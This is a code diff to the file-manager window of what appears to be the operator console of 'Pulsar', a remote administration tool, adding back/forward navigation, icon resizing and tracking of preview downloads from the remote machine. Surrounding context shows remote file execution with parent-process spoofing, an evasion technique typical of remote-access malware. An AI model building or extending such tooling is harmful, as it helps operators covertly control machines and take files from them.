@@ -134,6 +134,7 @@ namespace Pulsar.Server.Forms
             _fileManagerHandler = new FileManagerHandler(client);
 
             InitializeComponent();
+            UpdateNavButtons();
 
             // Enable DoubleBuffered via reflection to reduce flicker.
             typeof(Control).GetProperty(
@@ -247,7 +248,7 @@ namespace Pulsar.Server.Forms
             // If path points to a real directory → navigate
             if (isDir)
             {
-                _fileManagerHandler.GetDirectoryContents(newPath);
+                NavigateTo(newPath);
                 SetStatusMessage(this, $"Opening {newPath} ...");
                 return;
             }
@@ -278,17 +279,18 @@ namespace Pulsar.Server.Forms
             // If path has extension but isn't a real file → treat as directory
             if (Path.HasExtension(newPath))
             {
-                _fileManagerHandler.GetDirectoryContents(newPath);
+                NavigateTo(newPath);
+
                 return;
             }
 
             // Default → treat as directory
-            _fileManagerHandler.GetDirectoryContents(newPath);
+            NavigateTo(newPath);
 
             // ------------------------------------------------------
             // FOLDER navigation
             // ------------------------------------------------------
-            _fileManagerHandler.GetDirectoryContents(newPath);
+            NavigateTo(newPath);
             SetStatusMessage(this, $"Opening {newPath} ...");
 
             var timer = new System.Windows.Forms.Timer();
@@ -620,6 +622,7 @@ namespace Pulsar.Server.Forms
 
             return imageIndex;
         }
+        private readonly HashSet<string> _previewRequested = new(StringComparer.OrdinalIgnoreCase);
 
         private void FileTransferUpdated(object sender, FileTransfer t)
         {
@@ -674,18 +677,22 @@ namespace Pulsar.Server.Forms
             // -----------------------------
             // AUTO-PREVIEW FOR DOWNLOADS
             // -----------------------------
-            if (t.Type == TransferType.Download && t.Status == "Completed")
+            if (t.Type == TransferType.Download &&
+                t.Status == "Completed" &&
+                _previewRequested.Contains(t.RemotePath))
             {
+                _previewRequested.Remove(t.RemotePath);
+
                 string localPath = Path.Combine(
                     _connectClient.Value.DownloadDirectory,
                     Path.GetFileName(t.RemotePath));
 
                 this.BeginInvoke(new Action(() =>
                 {
-                    // FIX: use t.Size, NOT t.Length
                     EnsurePreviewFile(t.RemotePath, localPath, t.Size);
                 }));
             }
+
 
             // Refresh directory after upload
             if (t.Type == TransferType.Upload && t.Status == "Completed")
@@ -722,13 +729,24 @@ namespace Pulsar.Server.Forms
             else
                 return GetAbsolutePath(@"..\");
         }
-
+        private Image _original1;
+        private Image _original2;
         private void FrmFileManager_Load(object sender, EventArgs e)
         {
             this.Text = WindowHelper.GetWindowTitle("File Manager", _connectClient);
             _fileManagerHandler.RefreshDrives();
             // Load existing downloads into transfer list
             LoadExistingLocalDownloads();
+
+            // Load originals (from resources or files)
+            _original1 = Properties.Resources.backicon;    // example
+            _original2 = Properties.Resources.forwardicon; // example
+
+            ApplyButtonImages();
+
+            // Auto-update if button size changes
+            button1.Resize += (s, a) => ApplyButtonImages();
+            button2.Resize += (s, a) => ApplyButtonImages();
         }
 
         private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
@@ -742,7 +760,7 @@ namespace Pulsar.Server.Forms
             if (cmbDrives.SelectedValue == null)
                 return;
 
-            SwitchDirectory(cmbDrives.SelectedValue.ToString());
+            NavigateTo(cmbDrives.SelectedValue.ToString());
         }
 
         private void lstDirectory_DoubleClick(object sender, EventArgs e)
@@ -759,8 +777,7 @@ namespace Pulsar.Server.Forms
 
             if (index == 0)
             {
-                // ".."
-                SwitchDirectory(NavigateUp());
+                NavigateTo(NavigateUp());
                 return;
             }
 
@@ -773,7 +790,7 @@ namespace Pulsar.Server.Forms
             if (entry.EntryType == FileType.Directory)
             {
                 string newPath = GetAbsolutePath(entry.Name);
-                SwitchDirectory(newPath);
+                NavigateTo(newPath);
             }
         }
 
@@ -854,7 +871,7 @@ namespace Pulsar.Server.Forms
 
                 if (index == 0)
                 {
-                    SwitchDirectory(NavigateUp());
+                    NavigateTo(NavigateUp());
                     return;
                 }
 
@@ -867,7 +884,7 @@ namespace Pulsar.Server.Forms
                 if (entry.EntryType == FileType.Directory)
                 {
                     string newPath = GetAbsolutePath(entry.Name);
-                    SwitchDirectory(newPath);
+                    NavigateTo(newPath);
                     return;
                 }
             }
@@ -1562,6 +1579,7 @@ namespace Pulsar.Server.Forms
             {
                 if (!File.Exists(localPath))
                 {
+                    _previewRequested.Add(remotePath);   // mark as preview-triggered
                     Debug.WriteLine($"[PREVIEW] File does not exist – requesting download");
                     _fileManagerHandler.BeginDownloadFile(remotePath);
                 }
@@ -2664,6 +2682,101 @@ namespace Pulsar.Server.Forms
                 SetStatusMessage(this, $"Executing (PPID spoofed): {remotePath}");
             }
         }
+        private readonly Stack<string> _backHistory = new Stack<string>();
+        private readonly Stack<string> _forwardHistory = new Stack<string>();
+        private void NavigateTo(string remotePath)
+        {
+            if (string.IsNullOrWhiteSpace(remotePath))
+                return;
+
+            if (!string.IsNullOrEmpty(_currentDir) &&
+                !string.Equals(_currentDir, remotePath, StringComparison.OrdinalIgnoreCase))
+            {
+                _backHistory.Push(_currentDir);
+                _forwardHistory.Clear();
+            }
+
+            SwitchDirectory(remotePath);
+            UpdateNavButtons();
+        }
+
+        private void UpdateNavButtons()
+        {
+            button1.Enabled = _backHistory.Count > 0;  // Back
+            button2.Enabled = _forwardHistory.Count > 0; // Forward
+        }
+        private Image ResizeToFit(Image img, Size target)
+        {
+            double ratioX = (double)target.Width / img.Width;
+            double ratioY = (double)target.Height / img.Height;
+            double ratio = Math.Min(ratioX, ratioY);
+
+            int newW = (int)(img.Width * ratio);
+            int newH = (int)(img.Height * ratio);
+
+            Bitmap bmp = new Bitmap(newW, newH);
+            using (Graphics g = Graphics.FromImage(bmp))
+            {
+                g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
+                g.DrawImage(img, 0, 0, newW, newH);
+            }
+            return bmp;
+        }
+        private void ApplyButtonImages()
+        {
+            if (_original1 != null)
+            {
+                button1.Image?.Dispose();
+                button1.Image = ResizeToFit(_original1, button1.ClientSize);
+                button1.ImageAlign = ContentAlignment.MiddleCenter;
+            }
+
+            if (_original2 != null)
+            {
+                button2.Image?.Dispose();
+                button2.Image = ResizeToFit(_original2, button2.ClientSize);
+                button2.ImageAlign = ContentAlignment.MiddleCenter;
+            }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            // Back
+            if (_backHistory.Count == 0)
+                return;
+
+            string target = _backHistory.Pop();
+
+            if (!string.IsNullOrEmpty(_currentDir))
+                _forwardHistory.Push(_currentDir);
+
+            SwitchDirectory(target);
+            UpdateNavButtons();
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            // Forward
+            if (_forwardHistory.Count == 0)
+                return;
+
+            string target = _forwardHistory.Pop();
+
+            if (!string.IsNullOrEmpty(_currentDir))
+                _backHistory.Push(_currentDir);
+
+            SwitchDirectory(target);
+            UpdateNavButtons();
+        }
+
+        private void openDownloadFolderToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (!Directory.Exists(_connectClient.Value.DownloadDirectory))
+                Directory.CreateDirectory(_connectClient.Value.DownloadDirectory);
+
+            Process.Start("explorer.exe", _connectClient.Value.DownloadDirectory);
+        }
+
 
 
         // ------------------------ RedrawScope ------------------------
